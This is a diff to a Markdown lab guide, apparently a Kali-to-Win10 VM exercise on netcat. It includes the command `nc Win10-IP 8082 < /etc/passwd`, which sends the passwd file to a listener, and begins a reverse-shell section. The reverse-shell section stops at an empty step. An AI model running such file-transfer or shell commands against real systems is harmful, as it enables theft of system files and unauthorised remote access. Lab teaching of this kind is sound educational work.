@@ -157,4 +157,12 @@ ncat -l -p 8082 > newfile.txt
 ```
 nc Win10-IP 8082 < /etc/passwd
 ```
-9. After a few seconds, press <kbd>Ctrl</kbd>+<kbd>C</kbd> 
+9. After a few seconds, press <kbd>Ctrl</kbd>+<kbd>C</kbd> to close netcat on Kali
+10. Check the contents of `newfile.txt` on Win10 VM
+
+<u>Creating  a reverse shell:</u>
+1. Run netcat to connect to the listening netcat on Win10 on port 8989
+```
+nc Win10-IP 8989
+```
+2. 
